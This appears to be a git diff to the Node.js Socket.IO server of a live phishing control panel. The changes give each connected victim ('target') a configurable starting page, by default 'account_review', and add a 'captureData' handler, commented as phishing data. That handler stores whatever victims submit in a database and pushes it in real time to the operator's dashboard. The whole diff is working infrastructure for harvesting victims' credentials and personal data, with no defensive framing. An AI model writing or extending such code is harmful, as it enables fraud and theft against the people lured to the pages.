@@ -82,7 +82,21 @@ io.on('connection', (socket) => {
 
     // Generate unique ID for the target
     const targetID = uuidv4();
-    const start_page = "test"
+    
+    // Get starting page for user
+    let start_page = 'account_review';
+    try {
+      const userResult = await pool.query(
+        'SELECT starting_page FROM users WHERE username = $1',
+        [belongsto]
+      );
+      if (userResult.rows.length > 0) {
+        start_page = userResult.rows[0].starting_page || 'account_review';
+      }
+    } catch (err) {
+      console.error('Error getting starting page:', err);
+    }
+    
     // Derive IP address from the connection (may show "::1" for localhost)
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '0.0.0.0';
 
@@ -91,14 +105,14 @@ io.on('connection', (socket) => {
       await pool.query(
         `INSERT INTO targets (id, ip, status, currentpage, browser, location, belongsto)
          VALUES ($1, $2, 'Online', $3, $4, $5, $6)`,
-        [targetID, ip, currentPage, browser, location, belongsto]
+        [targetID, ip, start_page, browser, location, belongsto]
       );
 
-      console.log(`Inserted new target: ID=${targetID}, belongsto=${belongsto}`);
+      console.log(`Inserted new target: ID=${targetID}, belongsto=${belongsto}, start_page=${start_page}`);
       // Store the socket reference
       targetSockets.set(targetID, { socket, belongsto });
 
-      // Let the target know its assigned ID
+      // Let the target know its assigned ID and starting page
       socket.emit('identified', { targetID, start_page });
 
       // Broadcast this new target to the dashboard room of the user
@@ -106,7 +120,7 @@ io.on('connection', (socket) => {
         id: targetID,
         ip: ip,
         status: 'Online',
-        currentpage: currentPage,
+        currentpage: start_page,
         browser: browser,
         location: location,
         belongsto: belongsto
@@ -129,6 +143,35 @@ io.on('connection', (socket) => {
       console.log(`Emitted action "${action}" to target ${targetID}`);
     } else {
       console.log(`No target found with ID ${targetID}`);
+    }
+  });
+
+  // Handle captured data from targets (phishing data)
+  socket.on('captureData', async ({ targetID, page, data, timestamp }) => {
+    try {
+      console.log(`Captured data from target ${targetID} on page ${page}:`, data);
+      
+      // Store captured data in database
+      await pool.query(
+        `INSERT INTO captureddata (targetid, page, data, timestamp)
+         VALUES ($1, $2, $3, $4)`,
+        [targetID, page, JSON.stringify(data), timestamp]
+      );
+
+      // Notify dashboard about captured data
+      const targetEntry = targetSockets.get(targetID);
+      if (targetEntry) {
+        io.to(targetEntry.belongsto).emit('dataCaptured', {
+          targetID,
+          page,
+          data,
+          timestamp
+        });
+      }
+
+      console.log(`Stored captured data for target ${targetID}`);
+    } catch (err) {
+      console.error('Error storing captured data:', err);
     }
   });
 
